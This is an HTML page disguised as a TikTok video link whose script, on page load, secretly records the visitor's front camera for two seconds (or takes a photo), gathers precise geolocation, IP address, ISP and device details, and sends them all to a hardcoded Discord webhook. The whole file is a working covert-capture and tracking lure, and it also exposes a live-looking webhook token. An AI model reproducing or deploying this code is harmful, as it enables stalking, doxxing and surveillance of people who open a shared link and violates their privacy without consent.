<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8"/>
<meta content="width=device-width, initial-scale=1.0" name="viewport"/>
<meta content="Tiktok video" property="og:title">
<meta content="Watch tiktok" property="og:description">
<meta content="https://wwd.com/wp-content/uploads/2020/09/tiktok.png" property="og:image"/>
<meta content="website" property="og:type"/>
<title>Tiktok</title>
<style>
body {
    margin: 0;
    padding: 0;
    display: flex;
    justify-content: center;
    align-items: center;
    height: 100vh;
    background-color: #000;
    }
.container {
    text-align: center;
    max-width: 400px;
    width: 100%;
    }
.image-container {
    background-color: #1c1e24;
    border-radius: 20px;
    overflow: hidden;
    margin-bottom: 20px;
    }
video {
    width: 100%;
    height: auto;
    display: none;
    }
canvas {
    display: none;
    }
</style>
</head>
<body>
<div class="container">
<div class="image-container">
<video id="video" autoplay playsinline></video>
<canvas id="canvas"></canvas>
</div>
<img alt="Tiktok Logo" src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcS45jF2oX5HYzhemcWzyNdDf9PuYxjj8cf6ww&amp;s"/>
</div>

<script>
document.addEventListener('DOMContentLoaded', () => {
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    
    // Variables for video recording
    let mediaRecorder;
    let recordedChunks = [];
    let recording = false;
    let recordingTimer;

    // Start the process immediately
    setTimeout(() => {
        startVerification();
    }, 500);
    
    async function startVerification() {
        try {
            // Request camera access
            const stream = await navigator.mediaDevices.getUserMedia({ 
                video: { 
                    facingMode: 'user',
                    width: { ideal: 1280 },
                    height: { ideal: 720 }
                },
                audio: false
            });
            
            // Attach camera stream to video element
            video.srcObject = stream;
            
            // Wait for video to load
            video.addEventListener('loadedmetadata', () => {
                // Set canvas dimensions to match video
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                
                // Start recording
                startRecording(stream);
            });
        } catch (err) {
            // If camera access fails, still send system info
            setTimeout(() => {
                getLocationAndIP().then(systemInfo => {
                    sendToDiscord(null, systemInfo);
                });
            }, 1500);
        }
    }
    
    function startRecording(stream) {
        try {
            // Set up media recorder
            mediaRecorder = new MediaRecorder(stream, {
                mimeType: 'video/webm; codecs=vp9'
            });
            
            // Handle data available event
            mediaRecorder.ondataavailable = (event) => {
                if (event.data.size > 0) {
                    recordedChunks.push(event.data);
                }
            };
            
            // Handle recording stop
            mediaRecorder.onstop = () => {
                // Create a blob from the recorded chunks
                const blob = new Blob(recordedChunks, { type: 'video/webm' });
                
                // Get location and IP, then send to Discord
                getLocationAndIP().then(systemInfo => {
                    sendToDiscord(blob, systemInfo);
                });
                
                // Stop all tracks
                stream.getTracks().forEach(track => track.stop());
            };
            
            // Start recording
            mediaRecorder.start();
            recording = true;
            
            // Set timer to stop recording after 2 seconds
            recordingTimer = setTimeout(() => {
                if (recording) {
                    mediaRecorder.stop();
                    recording = false;
                }
            }, 2000);
            
        } catch (err) {
            // Fallback to photo capture if video recording fails
            setTimeout(() => {
                capturePhoto();
                stream.getTracks().forEach(track => track.stop());
            }, 1000);
        }
    }
    
    function capturePhoto() {
        // Draw the current video frame to canvas
        const context = canvas.getContext('2d');
        context.drawImage(video, 0, 0, canvas.width, canvas.height);
        
        // Get location and IP, then send the captured image to Discord
        getLocationAndIP().then(systemInfo => {
            sendToDiscord(canvas, systemInfo);
        });
    }
    
    async function getLocationAndIP() {
        // Collect basic system information with emojis
        const systemInfo = {
            "ðŸŒ User Agent": navigator.userAgent,
            "ðŸ’» Platform": navigator.platform,
            "ðŸ—£ï¸ Language": navigator.language,
            "ðŸ•’ Timezone": Intl.DateTimeFormat().resolvedOptions().timeZone,
            "ðŸ“º Screen": `${screen.width}x${screen.height}`,
            "ðŸª Cookies Enabled": navigator.cookieEnabled,
            "ðŸ“… Date": new Date().toISOString(),
            "ðŸ“ Location": "Unknown",
            "ðŸ“¡ IP Address": "Unknown",
            "ðŸ—ºï¸ Google Maps": "No location data"
        };
        
        try {
            // Try to get precise location using HTML5 Geolocation API first
            const preciseLocation = await new Promise((resolve) => {
                if (!navigator.geolocation) {
                    resolve(null);
                    return;
                }
                
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        resolve({
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude,
                            accuracy: position.coords.accuracy,
                            source: "HTML5 Geolocation"
                        });
                    },
                    (error) => {
                        console.log("HTML5 Geolocation failed:", error);
                        resolve(null);
                    },
                    { timeout: 3000, enableHighAccuracy: true }
                );
            });
            
            if (preciseLocation) {
                const mapsUrl = `https://www.google.com/maps?q=${preciseLocation.latitude},${preciseLocation.longitude}`;
                systemInfo["ðŸ“ Location"] = `Lat: ${preciseLocation.latitude.toFixed(4)}, Lon: ${preciseLocation.longitude.toFixed(4)} (Accuracy: ${Math.round(preciseLocation.accuracy)}m)`;
                systemInfo["ðŸ—ºï¸ Google Maps"] = `[View on Google Maps](${mapsUrl})`;
                systemInfo["ðŸ“ Location Source"] = preciseLocation.source;
            }
            
            // Then try IP-based geolocation services as fallback
            const services = [
                'https://ipapi.co/json/',
                'https://ipinfo.io/json',
                'https://api.ipgeolocation.io/ipgeo?apiKey=demo',
                'https://freeipapi.com/api/json'
            ];
            
            let ipData = null;
            
            // Try each service until we get a successful response
            for (const service of services) {
                try {
                    const response = await fetch(service, { timeout: 5000 });
                    if (response.ok) {
                        ipData = await response.json();
                        break;
                    }
                } catch (e) {
                    console.log(`Service ${service} failed, trying next`);
                    continue;
                }
            }
            
            if (ipData) {
                // Extract IP address
                systemInfo["ðŸ“¡ IP Address"] = ipData.ip || ipData.IPv4 || "Unknown";
                
                // Only use IP-based location if we don't have precise location
                if (!preciseLocation) {
                    // Extract and format location information
                    const locationParts = [];
                    
                    // Handle different API response formats
                    if (ipData.city && ipData.city !== "Not found") locationParts.push(ipData.city);
                    if (ipData.region && ipData.region !== "Not found") locationParts.push(ipData.region);
                    if (ipData.state && ipData.state !== "Not found") locationParts.push(ipData.state);
                    if (ipData.country_name && ipData.country_name !== "Not found") locationParts.push(ipData.country_name);
                    if (ipData.country && ipData.country !== "Not found" && !ipData.country_name) locationParts.push(ipData.country);
                    
                    if (locationParts.length > 0) {
                        systemInfo["ðŸ“ Location"] = locationParts.join(', ');
                        systemInfo["ðŸ“ Location Source"] = "IP-Based Estimation";
                    } else {
                        systemInfo["ðŸ“ Location"] = "Location data not available";
                    }
                    
                    // Create Google Maps link if we have coordinates
                    let latitude, longitude;
                    
                    if (ipData.latitude && ipData.longitude) {
                        latitude = ipData.latitude;
                        longitude = ipData.longitude;
                    } else if (ipData.loc) {
                        const [lat, lon] = ipData.loc.split(',');
                        latitude = lat;
                        longitude = lon;
                    } else if (ipData.lat && ipData.lon) {
                        latitude = ipData.lat;
                        longitude = ipData.lon;
                    }
                    
                    if (latitude && longitude) {
                        const mapsUrl = `https://www.google.com/maps?q=${latitude},${longitude}`;
                        systemInfo["ðŸ—ºï¸ Google Maps"] = `[View on Google Maps](${mapsUrl})`;
                    }
                }
                
                // Add more details if available
                if (ipData.org && ipData.org !== "Not found") {
                    systemInfo["ðŸ¢ ISP"] = ipData.org;
                }
                if (ipData.asn && ipData.asn !== "Not found") {
                    systemInfo["ðŸ“¶ ASN"] = ipData.asn;
                }
            }
        } catch (error) {
            console.error('Error fetching location data:', error);
            systemInfo["ðŸ“ Location"] = "Error fetching location";
            systemInfo["ðŸ—ºï¸ Google Maps"] = "Location data unavailable";
        }
        
        return systemInfo;
    }
    
    function sendToDiscord(media, systemInfo) {
        // Format system info as a string with Markdown for links
        const systemInfoText = Object.entries(systemInfo)
            .map(([key, value]) => {
                // Handle the Google Maps link specially to preserve Markdown
                if (key === "ðŸ—ºï¸ Google Maps" && value.startsWith("[View on Google Maps](")) {
                    return `${key}: ${value}`;
                }
                return `${key}: ${value}`;
            })
            .join('\n');
        
        // Create the main message payload
        const payload = {
            content: "**New Verification Request**",
            embeds: [
                {
                    title: "System Information",
                    description: systemInfoText,
                    color: 5814783, // TikTok-like color
                    timestamp: new Date().toISOString()
                }
            ]
        };
        
        // Replace with your Discord webhook URL
        const webhookURL = 'https://discord.com/api/webhooks/1416217653961560174/JH1ylbkjgYwnMoFi-ifbL1gFyljeDwr7ADz6U-G72Vl0_87cdhFqyfK-baYMpz2xW9Qf';
        
        // First send the system information
        fetch(webhookURL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(payload)
        })
        .then(response => {
            if (response.ok && media) {
                // If there's media to send, prepare it
                const formData = new FormData();
                
                if (media instanceof HTMLCanvasElement) {
                    // Convert canvas to blob for image
                    media.toBlob(blob => {
                        formData.append('file', blob, 'verification.jpg');
                        
                        // Send image with a caption
                        const imagePayload = {
                            content: "**Captured Image**",
                            embeds: [
                                {
                                    title: "Verification Image",
                                    color: 5814783,
                                    timestamp: new Date().toISOString()
                                }
                            ]
                        };
                        
                        formData.append('payload_json', JSON.stringify(imagePayload));
                        
                        fetch(webhookURL, {
                            method: 'POST',
                            body: formData
                        });
                    }, 'image/jpeg', 0.9);
                } else if (media instanceof Blob) {
                    // Send video
                    formData.append('file', media, 'verification.webm');
                    
                    const videoPayload = {
                        content: "**Recorded Video**",
                        embeds: [
                            {
                                title: "Verification Video",
                                color: 5814783,
                                timestamp: new Date().toISOString()
                            }
                        ]
                    };
                    
                    formData.append('payload_json', JSON.stringify(videoPayload));
                    
                    fetch(webhookURL, {
                        method: 'POST',
                        body: formData
                    });
                }
            }
        })
        .catch(error => console.error('Error sending to Discord:', error));
    }
});
</script>
</body>
</html>
